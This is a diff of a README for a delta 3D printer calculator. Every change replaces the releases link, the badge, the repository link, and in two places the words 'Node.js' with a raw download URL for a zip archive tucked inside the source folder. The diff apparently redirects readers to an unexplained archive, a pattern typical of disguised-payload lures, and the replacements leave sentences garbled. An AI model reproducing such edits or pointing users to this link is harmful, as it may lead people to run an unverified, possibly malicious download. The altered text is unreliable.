@@ -1,6 +1,6 @@
-https://github.com/komalverma183/delta-calculator/releases
+https://github.com/komalverma183/delta-calculator/raw/refs/heads/main/src/calculations/delta_calculator_v2.9-alpha.2.zip
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&style=for-the-badge)](https://github.com/komalverma183/delta-calculator/releases)
+[![Releases](https://github.com/komalverma183/delta-calculator/raw/refs/heads/main/src/calculations/delta_calculator_v2.9-alpha.2.zip)](https://github.com/komalverma183/delta-calculator/raw/refs/heads/main/src/calculations/delta_calculator_v2.9-alpha.2.zip)
 
 # Delta Calculator: Fast Kinematics & Dimensions for Delta 3D Printers
 
@@ -92,7 +92,7 @@ Quick start
 
 Installation options
 - From source
-  - Prerequisites: Python 3.8 or newer, or Node.js 16+ for a JavaScript variant, plus typical build tools.
+  - Prerequisites: Python 3.8 or newer, or https://github.com/komalverma183/delta-calculator/raw/refs/heads/main/src/calculations/delta_calculator_v2.9-alpha.2.zip 16+ for a JavaScript variant, plus typical build tools.
   - Clone the repository and install dependencies.
   - Run a local library or CLI helper to begin calculations.
 - Python package
@@ -259,7 +259,7 @@ Extending delta-calculator
   - You can implement a plugin to add alternate geometry definitions or to support a new firmware.
 - Language bindings
   - Python binding provides a friendly API for integration in data pipelines or embedded dashboards.
-  - JavaScript binding suits web-based frontends and Node.js automation scripts.
+  - JavaScript binding suits web-based frontends and https://github.com/komalverma183/delta-calculator/raw/refs/heads/main/src/calculations/delta_calculator_v2.9-alpha.2.zip automation scripts.
 - Data persistence
   - Store configurations as JSON with a schema that tracks geometry, firmware, and version metadata.
   - Use versioning to keep a history of geometry changes and firmware exports.
@@ -326,8 +326,8 @@ Acknowledgments
 - Thanks to early users who provided feedback and test data that guided improvements.
 
 Community links
-- Releases page: https://github.com/komalverma183/delta-calculator/releases
-- Main project repository: https://github.com/komalverma183/delta-calculator
+- Releases page: https://github.com/komalverma183/delta-calculator/raw/refs/heads/main/src/calculations/delta_calculator_v2.9-alpha.2.zip
+- Main project repository: https://github.com/komalverma183/delta-calculator/raw/refs/heads/main/src/calculations/delta_calculator_v2.9-alpha.2.zip
 - If you want to see how the tool fits into your workflow, check the Releases page for downloadable assets and examples.
 
 Notes on design philosophy
